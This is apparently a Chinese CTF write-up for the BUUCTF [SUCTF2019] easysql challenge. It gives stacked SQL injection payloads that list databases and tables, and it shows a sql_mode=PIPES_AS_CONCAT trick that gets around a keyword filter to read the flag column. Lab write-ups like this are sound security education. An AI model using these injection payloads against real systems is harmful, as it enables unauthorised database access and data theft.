# T26 easysql

> 题目：BUUCTF [SUCTF2019]easysql

__0x00 审题__

打开题目，要求提交查询

Give me your flag, I will tell you if the flag is right. 

猜测是sql注入，检测一圈发现，输入字母符号和0，都没有回显，输入非零数字有回显：Array ( [0] => 1 ) 

尝试查询字段数：1' order by 4#,得到回显Nonono,像是存在过滤，但是证明应该是可以进行sql注入，采取堆叠注入


__0x01 解题__

1. 1;show databases;

```
Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test ) 
```

切实可行

2. 1;show tables;

```
Array ( [0] => 1 ) Array ( [0] => Flag ) 
```
乘胜追击

3. 1;show columns from Flag;

回显nonono，又被拒绝了


* 解决方法：通过最初的只有非零数字有回显，推测||的存在

> 关于||，我们知道他作为逻辑运算符的含义（或），即为：a||b,有一方为真则返回真
> 猜测原题中：存在||，只有当我们输入非零数字才能满足，返回flag，猜测：select 输入||flag from Flag

因为这个‘或’的存在，让我们不好得到，现在不需要这个或的作用

4. set sql_mode=PIPES_AS_CONCAT

将||，的逻辑改为连接符

> concat()函数：将其中的数组合并输出

5. 1；set sql_mode=PIPES_AS_CONCAT；select 1；

> 拼接完成：select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag


__0x02 借鉴__

https://blog.csdn.net/bring_coco/article/details/108737434

https://blog.csdn.net/m0_62851980/article/details/124083026

__0x03 总结__

* 细致的观察与想象



